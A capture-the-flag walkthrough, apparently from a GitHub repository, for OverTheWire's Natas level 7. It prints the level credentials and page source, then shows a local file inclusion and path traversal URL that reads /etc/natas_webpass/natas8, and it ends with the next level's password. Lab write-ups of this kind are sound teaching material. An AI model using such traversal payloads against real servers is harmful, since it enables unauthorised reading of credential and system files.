# Natas7 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
URL: http://natas7.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- Source code:

```
  <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

- I tested here for LFI `http://natas7.natas.labs.overthewire.org/index.php?page=etc/natas_webpass/natas8` and got this:

<img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas7/lfi.png"/>

- Now, just do the path traversal and you will get a pssword. `http://natas7.natas.labs.overthewire.org/index.php?page=/../../../etc/natas_webpass/natas8`

<img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas7/password.png"/>


---

## 🏁 Password for the next level

`natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
